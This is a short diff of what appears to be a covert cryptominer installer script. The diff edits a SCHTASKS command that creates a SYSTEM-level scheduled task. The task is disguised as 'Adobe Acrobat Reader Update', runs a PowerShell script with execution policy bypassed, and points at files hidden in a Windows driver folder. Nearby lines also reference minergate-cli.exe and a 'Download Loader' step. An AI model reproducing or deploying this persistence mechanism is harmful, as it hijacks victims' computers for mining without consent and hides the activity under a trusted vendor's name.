@@ -37,7 +37,7 @@ Remove-Item C:\Windows\System32\drivers\en-US\etc\minergate-cli.exe
 
 
 # Create scheduled Start Task
-SCHTASKS /Create /RU "SYSTEM" /tn "Adobe Acrobat Reader Update" /sc Weekly /d MON,TUE,WED,THU,FRI,SAT,SUN /st 18:00:00 /du 12:30 /k /ri 10 /tr "powershell.exe -ExecutionPolicy Bypass C:\Windows\System32\drivers\en-US\etc\MinerGateRun.ps1"
+SCHTASKS /Create /RU "SYSTEM" /tn "Adobe Acrobat Reader Update" /sc Weekly /d MON,TUE,WED,THU,FRI,SAT,SUN /st 18:00:00 /du 12:30 /k /ri 10 /tr "powershell.exe -ExecutionPolicy Bypass C:\Windows\System32\drivers\en-US\etc\Line.ps1"
 
 
 # Download Loader
